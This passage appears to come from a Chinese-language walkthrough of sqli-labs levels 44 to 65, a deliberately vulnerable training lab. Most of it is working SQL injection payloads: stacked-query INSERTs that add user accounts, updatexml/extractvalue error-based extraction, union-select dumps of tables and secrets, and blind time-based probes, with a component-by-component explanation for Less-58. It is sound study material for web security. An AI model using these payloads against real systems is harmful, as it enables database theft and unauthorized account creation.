login_user=1&login_password=1';insert into users(id,username,password) values ('42','Less44','111111')--+&mysubmit=Login
~~~



后面使用已经插入的账号密码进行登录即可

![Less-44-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-44-03.png)

![Less-44-04](.\img\Less-44-04.png)



### Less-45

四十五关和四十三关一样，密码参数是单引号和括号闭合的。

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/dd1541bfde20f5a155ff97941c1722b1.png)



![Less-45-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-45-01.png)



![Less-45-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-45-02.png)

~~~ cmd
login_user=1&login_password=1');insert into users(id,username,password) values ('43','Less45','111111')--+&mysubmit=Login
~~~



使用插入的账号密码登录

![Less-45-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-45-03.png)

![Less-45-04](.\img\Less-45-04.png)



### Less-46

使用新的参数`sort`，通过输入`1，2，3`表中出现不同数据，该sql语句是`order by`，`sql`语句参数没有引号且不能使用联合注入，有报错显示，所以我们可以使用`updatexml`进行报错

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/abf8317de2bdc102c0c914da1c75787a.png)

~~~ cmd
?sort=1 and (updatexml(1,concat(0x5c,(select group_concat(password,'-',username) from users),0x5c),1))
#其中0x5c指的是ASCII码中的\
~~~

![](./img/Less-46-01.PNG)



### Less-47

使用新的参数`sort`，通过输入`1，2，3`表中出现不同数据，该sql语句是`order by`，`sql`语句参数没有引号且不能使用联合注入，有报错显示，所以我们可以使用`updatexml`进行报错。而且多了一个单引号闭合，所以可以使用报错注入

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/57d0471ff1e06ca723219b3f863098ef.png)



~~~ cmd
?sort=1‘ and (updatexml(1,concat(0x5c,(select group_concat(password,'-',username) from users),0x5c),1))
#其中0x5c指的是ASCII码中的\
~~~

![](./img/Less-47-01.PNG)



### Less-48

使用新的参数`sort`，通过输入`1，2，3`表中出现不同数据，该sql语句是`order by`，`sql`语句参数没有引号且不能使用联合注入，并且没有报错显示，所以使用延时注入。

![](./img/b13887d2b0955f92f3140663acbecce9.png)





### Less-49

四十九关和四十七关一样，不过没有报错显示，所以使用延时注入。

![](./img/a51aa0d68040cbe39d920de44f344e1b.png)



### Less-50

五十关和四十六关一样，可以使用updatexml进行报错注入，不过这个里面还可以使用堆叠注入，因为使用了mysqli_multi_query函数，支持多条sql语句执行。也可以延时注入。可以借鉴三十八代码

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/861f275ca1eed50e34dece79ef6af964.png)



### Less-51

该参数单引号闭合，可以报错注入，可以延时注入，可以堆叠注入

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/a79817b6f469078b522c10005ee934c2.png)





~~~ cmd
?sort=1%27;insert%20into%20users(id,username,password)%20values%20(%2750%27,%27less38%27,%27hello%27)--+
~~~

![](.\img\Less-50-01.PNG)



### Less-52

该参数是整数型，且没有报错显示，只能堆叠注入或者延时注入

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/77b3398c5f7c504b364f7ac4ba9332f3.png)



可用堆叠注入

~~~ cmd
?sort=1;insert%20into%20users(id,username,password)%20values%20(%2752%27,%27less38%27,%27hello%27)--+
~~~

![](./img/Less-52-01.PNG)



### Less-53

该参数是字符型，单引号闭合，没有报错显示，可以使用堆叠注入和延时注入。

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/8ec2e8d4426094740bc66f73b2d3d252.png)



~~~ cmd
sort=-1%27;insert%20into%20users(id,username,password)%20values%20(%2753%27,%27less38%27,%27hello%27)--+
~~~

![](.\img\Less-53-01.PNG)



### Less-54

五十四关翻译页面的英文，得知只有十次输入机会，超过十次所有表名，列名，等等都会随机重置。id参数是单引号闭合就行。

![Less-54-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/8af33a53059d1ae86882ac4125639932.png)



~~~ cmd
?id=1
~~~

![Less-54-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-54-02.PNG)



~~~ cmd
？id=1'
~~~

![Less-54-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-54-01.PNG)

两者不同，由此可判断该处存在`sql`注入点



~~~ cmd
?id=-1 union select 1,2,3--+
~~~

可以联合注入，由此就是正常流程了

![Less-54-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-54-03.PNG)



~~~ cmd
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
~~~

![Less-54-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-54-04.PNG)

其中，这次的`table_name`是`D1LTYW5BW8`，对于每次运行网站该名都会改变



~~~ cmd
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='D1LTYW5BW8' and table_schema=database()--+
~~~

![Less-54-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-54-05.PNG)



~~~ cmd
?id=-1' union select 1,group_concat(secret_6K0N),3 from D1LTYW5BW8--+
~~~

由此获得正确的key值

![Less-54-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-54-06.PNG)



将获取的key值放到下面输入框点击提交，就完成所有步骤。



### Less-55

五十五关是有14次机会，id参数是加了括号的整数，还是正常流程，先闭合再拖库

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/a516af628f76da9d8d35643c816d811a.png)

![Less-55-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-01.PNG)



~~~ cmd
?id=1
~~~

![Less-55-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-02.PNG)





~~~ cmd
?id=1)
~~~

![Less-55-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-03.PNG)



两者不一致，说明这里存在`sql`注入点



~~~ cmd
?id=1) union select 1,2,3--+
~~~

![Less-55-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-04.PNG)



~~~ cmd
?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()--+
~~~

![Less-55-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-05.PNG)



~~~ cmd
?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name="2F1CH3L20D"--+
~~~

![Less-55-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-06.PNG)



~~~ cmd
?id=-1) union select 1,group_concat(secret_A8VM),3 from 2F1CH3L20D--+
~~~

![Less-55-07](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-55-07.PNG)



由此成功爆破出`secret_key`



### Less-56

五十六关需要单引号和括号

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/0689c9f477087e64b099a5b195b3fba4.png)



~~~ cmd 
?id=-1 union select 1,2,3--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-56-01.PNG)



~~~ cmd
?id=-1’) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-56-02.PNG)



~~~ cmd
?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name="SXKFOWFC9B"--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-56-03.PNG)



~~~ cmd
?id=-1') union select 1,group_concat(secret_7W08),3 from SXKFOWFC9B--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-56-04.PNG)



由此成功



### Less-57

代码审计可看出，这关是双引号闭合

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/b46c30b5992229e745a726e1c208a54a.png)



~~~ cmd
?id=1
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-57-01.PNG)



~~~ cmd
？id=1"
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-57-02.PNG)



~~~ cmd
?id=-1" union select 1,2,3--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-57-03.PNG)



~~~ cmd
?id=-1" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-57-04.PNG)



~~~ cmd
?id=-1" union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name="7RKM0LN0LB"--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-57-05.PNG)



~~~ cmd
?id=-1" union select 1,group_concat(secret_PZ2C),3 from 7RKM0LN0LB--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-57-06.PNG)

由此成功



### Less-58

该关卡的数据不是直接数据库里面取得，而是在一个数组里面取出得。所以联合注入是不行得。但是有报错显示，所以可以使用报错注入。

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/ab1845ed4030ba4e454c2630c4fa6428.png)





**【分析源码】**：

可以看见，这里的逻辑是先查询，根据查询返回用户名结果去储存用户名的数组里面找密码（密码就是用户名数组的逆序）。所以这里联合注入无效了，联合注入注入出东西用户名数组里面没有，就没有返回值。

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/e7ca443cf1d979b6afce27955c21226b.png)

继续往下看，发现开启了报错，所以我们可以用报错注入

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/fc4d13aa7e49c9719f9c447605cb8c4a.png)

源码中查询语句基于`select`，这里报错注入的语句也得基于`select`。



#### 爆库

```sql
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
```

1. **`?id=1'`**  
   - URL 查询参数，尝试将 `id` 的值设置为 `1'`。  
   - 目的：闭合后端 SQL 语句中原本的字符串单引号，使后续注入的代码能够被解析执行。

2. **`and`**  
   - SQL 逻辑运算符，用于连接原始条件与注入的报错注入语句。  
   - 作用：使整个查询条件成立时（通常为 `and 1=1` 效果），触发 `updatexml` 函数。

3. **`updatexml(1, concat(0x7e, (子查询), 0x7e), 1)`**  
   - MySQL 的 `updatexml()` 函数，本用于修改 XML 文档，但此处利用其报错特性进行信息提取。  
   - 参数1（`1`）：XML 文档片段（无实际意义，仅作占位）。  
   - 参数2（`concat(..., ..., ...)`）：构造一个无效的 XPath 表达式，强制报错并显示拼接后的字符串。  
   - 参数3（`1`）：新值（无实际意义）。  
   - 由于 XPath 表达式包含 `~`（ASCII 0x7e）和子查询结果，表达式非法，MySQL 会报错并输出表达式内容，从而泄露数据。

4. **`concat(0x7e, (子查询), 0x7e)`**  
   - `0x7e` 是波浪号 `~` 的十六进制表示，用作报错信息中的分隔符，便于观察提取的数据。  
   - 中间嵌套的子查询用于从数据库元数据表中获取表名。

5. **`(select group_concat(table_name) from information_schema.tables where table_schema='challenges')`**  
   - 子查询：从 `information_schema.tables`（MySQL 系统表，存储所有表元数据）中查询 `table_schema`（数据库名）为 `'challenges'` 的所有表名。  
   - `group_concat(table_name)` 将多个表名用逗号连接成一个字符串。  
   - 最终结果会被拼接到 XPath 表达式中，并通过报错信息输出。

6. **`--+`**  
   - `--` 是 SQL 单行注释符号，用于注释掉原始 SQL 语句中 `id=1'` 之后的所有剩余代码（如原有的 `'` 或其他条件）。  
   - `+` 在 URL 中被解码为空格，确保注释符与后续内容正确分隔。



或者

```sql
?id=-1' AND EXTRACTVALUE(1,(CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),0x7e))) --%20--+
```

1. **`?id=-1'`**  
   - URL 查询参数，将 `id` 赋值为 `-1'`。  
   - `-1` 使原始查询条件返回 false（假设无 `id=-1` 的记录），目的是不干扰报错信息的输出；  
   - 结尾的单引号 `'` 用于闭合后端 SQL 语句中原本的字符串定界符，使后续注入的代码成为有效 SQL 语法。

2. **`AND`**  
   - SQL 逻辑运算符，将原始查询条件（`id=-1'`）与后面的报错注入语句连接。  
   - 由于 `id=-1'` 为假，整个 `AND` 表达式结果为假，但 MySQL 仍会执行 `EXTRACTVALUE` 函数，从而触发报错并泄露信息。

3. **`EXTRACTVALUE(1, (CONCAT(0x7e, (子查询), 0x7e)))`**  
   - MySQL 的 `EXTRACTVALUE()` 函数，本用于从 XML 字符串中提取值。这里利用其第二个参数（XPath 表达式）非法时报错并显示表达式内容的特性。  
   - 参数1（`1`）：无实际意义的 XML 片段占位。  
   - 参数2：由 `CONCAT` 构造的非法 XPath 表达式，导致函数报错，输出表达式本身，从而泄露内部拼接的数据。

4. **`CONCAT(0x7e, (SELECT ...), 0x7e)`**  
   - 将波浪号 `~`（ASCII 0x7e）与子查询结果及另一个波浪号拼接。  
   - 波浪号不是合法的 XPath 语法，因此会触发报错，并在错误信息中显示完整的拼接字符串，便于区分数据边界。

5. **`(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())`**  
   - 子查询：从 MySQL 系统表 `information_schema.tables` 中查询当前数据库（`DATABASE()` 返回当前库名）的所有表名。  
   - `GROUP_CONCAT(table_name)` 将所有表名合并为一个逗号分隔的字符串（例如 `users,products,orders`）。  
   - 该结果会被拼接进 XPath 表达式，最终通过报错信息输出。

6. **`--%20--+`**  
   - `--` 是 SQL 的单行注释标记，用于注释掉原始 SQL 语句中 `?id=-1'` 之后剩余的部分（如原本的结尾引号或其他条件）。  
   - `%20` 是 URL 编码的空格，确保注释符 `--` 后面紧跟一个空格（SQL 语法要求）。  
   - 第二个 `--+` 可能是多余的注释写法，其中 `+` 在 URL 中被解码为空格，因此整体等价于 `--  -- `，进一步确保注释生效。实际上只需一个 `--` 加空格即可，此处为攻击者的冗余习惯。



或者

```sql
?id=-1' union select 1,2,(extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))))--+
```

1. **`?id=-1'`**  
   - URL 查询参数，将 `id` 赋值为 `-1'`。  
   - `-1` 使得原查询（假设 `id` 为正数）返回空结果，避免干扰联合查询的输出。  
   - 结尾的单引号 `'` 用于闭合后端 SQL 语句中原本的字符串定界符（例如 `WHERE id='$id'` 中的第一个单引号），使后续注入的 `union` 成为有效 SQL 语法。

2. **`union select 1,2,( ... )`**  
   - SQL 的 `UNION` 操作符，用于合并两个查询的结果集。这里利用其将攻击者构造的查询结果附加到原始查询之后。  
   - 需要与原始查询的列数匹配，`1,2` 是占位符（假设原始查询有 3 列，这里第 3 列使用报错注入函数）。  
   - 由于原始查询因 `id=-1` 无返回，最终页面显示的内容将来自 `UNION` 后面的查询（如果未报错），但这里实际利用的是 `extractvalue` 的报错机制。

3. **`extractvalue(1, concat(0x7e, (子查询), 0x7e))`**  
   - MySQL 的 `EXTRACTVALUE()` 函数，本用于从 XML 字符串中提取值。此处利用其第二个参数（XPath 表达式）非法时返回错误信息并显示表达式内容的特性。  
   - 参数1（`1`）：无实际意义的 XML 片段占位。  
   - 参数2：通过 `CONCAT` 构造的非法 XPath 表达式，导致函数报错，从而在错误信息中泄露拼接的字符串。

4. **`concat(0x7e, (select group_concat(schema_name) from information_schema.schemata), 0x7e)`**  
   - `0x7e` 是波浪号 `~` 的十六进制表示，用作报错信息中的分隔符，便于观察提取的数据。  
   - 中间的子查询从 `information_schema.schemata`（MySQL 系统表，存储所有数据库名）中查询所有 `schema_name`（数据库名）。  
   - `group_concat(schema_name)` 将所有数据库名合并为一个逗号分隔的字符串（例如 `mysql,challenges,test,...`）。  
   - 整体拼接成 `~db1,db2,db3~` 的形式，作为 XPath 表达式，因包含 `~` 非法，触发报错。

5. **`--+`**  
   - `--` 是 SQL 的单行注释标记，用于注释掉原始 SQL 语句中 `id=-1'` 之后剩余的部分（如原本结尾的另一个单引号或其他查询条件）。  
   - `+` 在 URL 中被解码为空格，确保注释符 `--` 后面紧跟一个空格（SQL 语法要求注释符后必须有空格或控制字符）。  
   - 整个 `--+` 使注入语句后的原始 SQL 代码被忽略，避免语法错误。





![Less-58-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-58-01.PNG)



~~~ cmd
?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='P0OG7GKLDD'),0x7e),1)--+
~~~

![Less-58-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-58-02.PNG)



~~~ cmd
?id=1' and updatexml(1,concat(0x7e,(select group_concat(secret_EL3Q) from P0OG7GKLDD),0x7e),1)--+
~~~

![Less-58-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-58-03.PNG)



至此成功



### Less-59

五十九关和五十八关一样使用报错注入，id是整数型。

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/5d478ac77a2c78dfc2aaba7c3bc85e5d.png)



#### 爆库

~~~ cmd
?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-59-01.PNG)



#### 爆列

~~~ cmd
?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='V9J0SQ759Q'),0x7e),1)--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-59-02.PNG)



#### 爆数据

~~~ cmd
?id=1 and updatexml(1,concat(0x7e,(select group_concat(secret_FKSV) from V9J0SQ759Q),0x7e),1)--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-59-03.PNG)

至此成功



### Less-60

六十关根据报错信息可知id参数是双引号加括号

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/f68708a1b6e7fa283b7521dd98dd5e00.png)



#### 爆表

~~~ cmd
?id=1") and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-60-01.PNG)



#### 爆列

~~~ cmd
?id=1") and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='NTXT24T09Q'),0x7e),1)--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-60-02.PNG)



#### 爆数据

~~~ cmd
?id=1") and updatexml(1,concat(0x7e,(select group_concat(secret_68FZ) from NTXT24T09Q),0x7e),1)--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-60-03.PNG)

至此成功



### Less-61

六十一关根据报错信息可知id参数是单引号加两个括号

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/f197b6d2d20591434ea4dd23250a666f.png)



#### 爆表

~~~ cmd
?id=1')) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-61-01.PNG)



#### 爆列

~~~ cmd
?id=1')) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='1MPGCD92XR'),0x7e),1)--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-61-02.PNG)



#### 爆数据

~~~ cmd
?id=1')) and updatexml(1,concat(0x7e,(select group_concat(secret_JS1S) from 1MPGCD92XR),0x7e),1)--+
~~~

![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-61-03.PNG)

至此成功



### Less-62

六十二关没有报错显示，可以使用布尔盲注和时间注入。id参数是单引号加括号

~~~ cmd
?id=1') and if(length((select database()))=10,sleep(5),1)--+  时间注入，如果出现延迟表示该数据库名长度是10 
 
 
?id=1')and length((select database()))=10--+  布尔盲注,正确的话返回正常页面否则不会返回正常页面
~~~

![](./img/3df93d35acc1a1453696f45fa7e8691f.png)



### Less-63

六十三关没有报错显示，可以使用布尔盲注和时间注入。id参数是单引号。

![](./img/3f63158d6ada119aa2ddcb50db6e58a9.png)



### Less-64

id参数是两个括号的整数型

![](./img/d1ca3ec6388bf5c364e8664900f1b209.png)



### Less-65

id参数是一个括号的整数型

![](./img/5c50bea2ba523fe1b9db9a720ed9ea9a.png)
